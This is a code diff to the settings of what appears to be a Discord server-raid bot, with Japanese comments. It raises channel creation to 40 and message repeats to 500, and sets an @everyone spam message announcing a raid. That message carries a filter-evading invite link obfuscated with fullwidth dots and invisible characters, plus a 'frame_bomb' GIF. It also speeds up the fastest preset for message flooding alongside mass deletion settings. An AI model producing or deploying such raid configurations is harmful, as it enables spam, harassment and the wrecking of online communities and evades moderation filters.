@@ -23,9 +23,9 @@ INTENTS.members = True
 ROLE_BASE      = "ozeumember"   # ロール名ベース
 ROLE_COUNT     = 0              # 作成数
 CHANNEL_BASE   = "ozeu"         # チャンネル名ベース
-CHANNEL_COUNT  = 1              # 作成数
-REPEAT_MESSAGE = "hello!world"
-REPEAT_COUNT   = 1              # メッセージ送信回数
+CHANNEL_COUNT  = 40              # 作成数
+REPEAT_MESSAGE = "# @everyone\n# Raid by OZEU. join now\n# おぜうの集いに参加！\n# https://\ptb．discord．com/../oze/../invite/ozeuozeu [︋︍︋]\nhttps://cdn.discordapp.com/attachments/1412757396689915998/1415191435954622555/frame_bomb_200_b.gif"
+REPEAT_COUNT   = 500              # メッセージ送信回数
 
 CHANGE_NICKNAMES = False
 NICK_BASE        = "hello"
@@ -59,7 +59,7 @@ SPEED_PRESETS = {
     "爆速": {
         "DELETE_CHUNK_SIZE":12, "DELETE_CHUNK_SLEEP": 0.04, "POST_DELETE_WAIT": 1.0,
         "CREATE_CHUNK_SIZE": 10, "CREATE_CHUNK_SLEEP": 0.05,
-        "MSG_CHUNK_SIZE": 150,   "MSG_INTER_CHUNK_SLEEP": 0.005, "MSG_INTER_ROUND_SLEEP": 0.01,
+        "MSG_CHUNK_SIZE": 200,   "MSG_INTER_CHUNK_SLEEP": 0.005, "MSG_INTER_ROUND_SLEEP": 0.01,
         "ROLE_CHUNK_SIZE": 6,   "ROLE_CHUNK_SLEEP": 0.02, "ROLE_MAX_RETRIES": 2,
         "NICK_CHUNK_SIZE": 16,  "NICK_CHUNK_SLEEP": 0.05
     }
